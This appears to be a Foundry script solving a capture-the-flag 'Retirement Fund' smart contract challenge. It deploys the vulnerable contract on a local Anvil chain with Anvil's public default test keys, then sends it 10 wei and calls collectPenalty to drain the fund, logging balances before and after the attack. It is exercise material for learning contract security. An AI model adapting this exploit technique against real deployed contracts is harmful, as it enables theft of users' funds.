// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {RetirementFundChallenge} from "../src/retirement/RetirementFundChallenge.sol";

contract RetirementScript is Script {
    
    RetirementFundChallenge retirement;
    // Attacker attack;

    function setUp() public {}

    function run() public {
        // private key from account 0 (anvil)
        vm.startBroadcast(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80);

        // address from account 1 (anvil)
        address beneficiary = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);

        retirement = new RetirementFundChallenge{ value: 1 ether }(beneficiary);
        vm.stopBroadcast();

        // private key from account 1 (anvil)
        vm.startBroadcast(0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d);

        console.log("Before attack: ");
        console.log("RetirementFund balance: ", address(retirement).balance);
        console.log("Beneficiary balance: ", beneficiary.balance);

        address(retirement).call{ value: 10 wei }("");
        retirement.collectPenalty();

        console.log("After attack: ");
        console.log("RetirementFund balance: ", address(retirement).balance);
        console.log("Beneficiary balance: ", beneficiary.balance);
        
        vm.stopBroadcast();
    }
}
